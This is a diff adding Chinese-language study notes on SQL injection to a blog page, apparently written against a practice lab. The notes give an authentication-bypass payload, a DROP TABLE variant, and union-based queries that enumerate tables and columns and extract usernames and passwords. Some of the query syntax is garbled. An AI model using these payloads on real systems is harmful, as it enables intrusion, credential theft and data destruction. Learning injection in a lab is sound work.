@@ -574,7 +574,12 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>学习环境：MySQL+phpstudy</p>
+<p>注入原理：<br>String sql &#x3D;”select count(*) from admin where usename &#x3D;’”+admin.GetUsername()”‘+” and password &#x3D;’”+admin.getPassword”‘“</p>
+<p>select count(<em>) from admin where username&#x3D;’admin’ and pasword&#x3D;’password’<br>select count(</em>) from admin where username&#x3D;’’or 1&#x3D;1–’ and pasword&#x3D;’’</p>
+<p>‘or 1&#x3D;1–’  注释了后面的password，并且1&#x3D;1这条语句永远为真。<br>这条语句相当于select count(*) from admin  &#x2F;&#x2F;查询admin表里所有的数据<br>甚至 ‘ or 1&#x3D;1;drop table admin – 删除admin表</p>
+<p>&#x2F;&#x2F;查询表的表、列、字段<br>?id&#x3D;1 and 1&#x3D;1<br>当?id&#x3D;1   id&#x3D;2   id&#x3D;5   出现正常回显，？id&#x3D;1’时出现报错说明此时有注入点<br>?id&#x3D;1’ and 1&#x3D;2<br>?id&#x3D;1  order by  4–+<br>?id&#x3D;1’ union select by 1,2,3–+<br>?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’–+<br>?id&#x3D;-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’–+<br>?id&#x3D;-1’ union select 1,group_concat(username,password),3 from users–+</p>
+
                 
             </div>
             <hr/>
